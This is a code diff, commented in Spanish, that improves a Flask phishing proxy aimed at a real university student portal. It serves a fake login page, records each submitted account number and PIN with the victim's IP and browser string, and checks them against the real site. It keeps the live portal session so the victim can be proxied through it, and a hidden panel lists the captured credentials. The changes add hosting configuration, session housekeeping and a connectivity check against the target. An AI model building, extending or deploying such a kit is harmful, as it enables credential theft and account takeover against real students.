@@ -1,5 +1,6 @@
 import os
 import json
+import time
 import logging
 import secrets
 import threading
@@ -8,35 +9,50 @@ from urllib.parse import urljoin, urlsplit
 
 import requests
 from flask import (Flask, request, render_template, redirect,
-                   Response, make_response)
+                   Response, jsonify)
 
-app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(24)
+# --- Configuracion del despliegue --------------------------------------------
+PUERTO = int(os.environ.get("PORT", 5000))
+DIR_DATOS = os.environ.get("DIR_DATOS", ".")
+RUTA_PANEL = os.environ.get("RUTA_PANEL", "panel")
+ARCHIVO = os.path.join(DIR_DATOS, "capturas.json")
+ARCHIVO_LOG = os.path.join(DIR_DATOS, "capturas.log")
+EN_RENDER = bool(os.environ.get("RENDER"))
 
 # --- Objetivo real -----------------------------------------------------------
 BASE = "https://siia.uasnet.mx"
-RUTA_LOGIN = "/alumnos/Default.php"      # aqui se crea la sesion PHP
+RUTA_LOGIN = "/alumnos/Default.php"        # aqui se crea la sesion PHP
 DESTINO_REAL = BASE + "/alumnos/home.php"  # action real del formulario
 
-PUERTO = int(os.environ.get("PORT", 5000))
-RUTA_PANEL = os.environ.get("RUTA_PANEL", "panel")
-ARCHIVO = "capturas.json"
-TIMEOUT = 20
+TIMEOUT = 10                 # corto: gunicorn mata al worker a los 120 s
+MAX_SESIONES = 300
+VIDA_SESION = 3600           # segundos antes de purgar una sesion huerfana
 UA_DEFECTO = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
 
+app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
+
 _lock = threading.Lock()
-_sesiones = {}            # sid -> requests.Session (cookie PHPSESSID vive aqui)
+_sesiones = {}               # sid -> [requests.Session, ultimo_uso]
 _sesiones_lock = threading.Lock()
+
+os.makedirs(DIR_DATOS, exist_ok=True)
+
+_manejadores = [logging.StreamHandler()]
+try:
+    _manejadores.insert(0, logging.FileHandler(ARCHIVO_LOG, encoding="utf-8"))
+except OSError:
+    pass
 
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[logging.FileHandler("capturas.log", encoding="utf-8"),
-              logging.StreamHandler()],
+    handlers=_manejadores,
 )
 
 
+# --- Persistencia ------------------------------------------------------------
 def cargar():
     try:
         with open(ARCHIVO, encoding="utf-8") as f:
@@ -46,10 +62,13 @@ def cargar():
 
 
 def guardar(datos):
-    with open(ARCHIVO, "w", encoding="utf-8") as f:
+    tmp = ARCHIVO + ".tmp"
+    with open(tmp, "w", encoding="utf-8") as f:
         json.dump(datos, f, ensure_ascii=False, indent=2)
+    os.replace(tmp, ARCHIVO)          # escritura atomica
 
 
+# --- Utilidades --------------------------------------------------------------
 def _a_local(url):
     """Convierte una URL del portal real en ruta local nuestra."""
     p = urlsplit(url)
@@ -59,11 +78,20 @@ def _a_local(url):
     return ruta + (("?" + p.query) if p.query else "")
 
 
+def _podar_sesiones():
+    """Elimina sesiones viejas o de mas. Se llama con _sesiones_lock tomado."""
+    ahora = time.time()
+    for sid in [k for k, v in _sesiones.items() if ahora - v[1] > VIDA_SESION]:
+        del _sesiones[sid]
+    while len(_sesiones) > MAX_SESIONES:
+        del _sesiones[min(_sesiones, key=lambda k: _sesiones[k][1])]
+
+
 # --- Login falso -------------------------------------------------------------
 @app.route("/")
 @app.route("/login")
 def login():
-    return render_template("login.html", error=None)
+    return render_template("login.html", error=None, cuenta="")
 
 
 @app.route("/login", methods=["POST"])
@@ -72,7 +100,8 @@ def capturar():
     nip = (request.form.get("txtNip") or "").strip()[:20]
 
     if not cuenta or not nip:
-        return render_template("login.html", error="No. Cuenta o NIP incorrectos",
+        return render_template("login.html",
+                               error="No. Cuenta o NIP incorrectos",
                                cuenta=cuenta), 400
 
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -105,8 +134,12 @@ def capturar():
     with _lock:
         capturas = cargar()
         capturas.append({
-            "cuenta": cuenta, "nip": nip, "valido": valido, "ip": ip,
-            "ua": ua[:200], "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "cuenta": cuenta,
+            "nip": nip,
+            "valido": valido,
+            "ip": ip,
+            "ua": ua[:200],
+            "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         })
         guardar(capturas)
 
@@ -121,10 +154,12 @@ def capturar():
     # Credenciales buenas: guardamos la sesion del portal y damos paso.
     sid = secrets.token_urlsafe(24)
     with _sesiones_lock:
-        _sesiones[sid] = s
+        _sesiones[sid] = [s, time.time()]
+        _podar_sesiones()
 
     resp = redirect(_a_local(r.url), code=302)
-    resp.set_cookie("sid", sid, httponly=True, samesite="Lax", max_age=3600)
+    resp.set_cookie("sid", sid, httponly=True, samesite="Lax",
+                    secure=EN_RENDER, max_age=VIDA_SESION)
     return resp
 
 
@@ -135,10 +170,16 @@ def proxy(ruta):
         return panel()
 
     sid = request.cookies.get("sid")
-    with _sesiones_lock:
-        s = _sesiones.get(sid) if sid else None
-    if s is None:
+    entrada = None
+    if sid:
+        with _sesiones_lock:
+            entrada = _sesiones.get(sid)
+            if entrada is not None:
+                entrada[1] = time.time()
+    if entrada is None:
         return redirect("/", code=302)          # sesion caducada -> al login
+
+    s = entrada[0]
 
     url = BASE + "/" + ruta
     if request.query_string:
@@ -185,6 +226,25 @@ def panel():
     return render_template("panel.html", credenciales=list(reversed(capturas)))
 
 
+# --- Diagnostico -------------------------------------------------------------
+@app.route("/diag")
+def diag():
+    t0 = time.time()
+    try:
+        r = requests.get(BASE + RUTA_LOGIN, timeout=TIMEOUT,
+                         headers={"User-Agent": UA_DEFECTO})
+        return jsonify({
+            "status": r.status_code,
+            "bytes": len(r.content),
+            "tiene_formulario": 'name="txtNip"' in r.text,
+            "ms": int((time.time() - t0) * 1000),
+            "cookies": list(r.cookies.keys()),
+            "sesiones_activas": len(_sesiones),
+        })
+    except requests.RequestException as e:
+        return jsonify({"error": str(e)[:300]}), 502
+
+
 if __name__ == "__main__":
     logging.info("Falsa: / | Panel: /%s | Puente: %s", RUTA_PANEL, DESTINO_REAL)
-    app.run(host="0.0.0.0", port=PUERTO, debug=False)
+    app.run(host="0.0.0.0", port=PUERTO, debug=False, threaded=True)
